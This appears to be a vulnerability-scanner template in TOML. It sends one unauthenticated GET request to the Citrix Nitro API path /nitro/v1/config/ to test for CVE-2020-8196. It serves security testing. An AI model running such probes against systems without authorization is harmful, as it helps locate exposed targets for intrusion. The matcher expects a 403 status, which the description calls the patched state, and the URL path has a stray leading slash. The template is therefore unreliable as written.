[info]
author = "ave"
description = "验证 Citrix ADC/Gateway Nitro API 是否允许未授权访问。向 /nitro/v1/config/ 发送无凭据的 GET 请求，若返回 403 则表示访问控制正常、漏洞已修复；若返回 200 则表示未授权访问成功、漏洞存在。"
id = "POC-AVE-2020-1809"
name = "CVE-2020-8196 Citrix Nitro API Unauthorized Access PoC"
severity = "medium"
tags = ["ave-2020-1809"]
vuln_id = [
    "CVE-2020-8196",
    "AVE-2020-1809",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/nitro/v1/config/"
protocol = "http"

[poc.requests.headers]
Accept = "application/json"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [403]
type = "status"
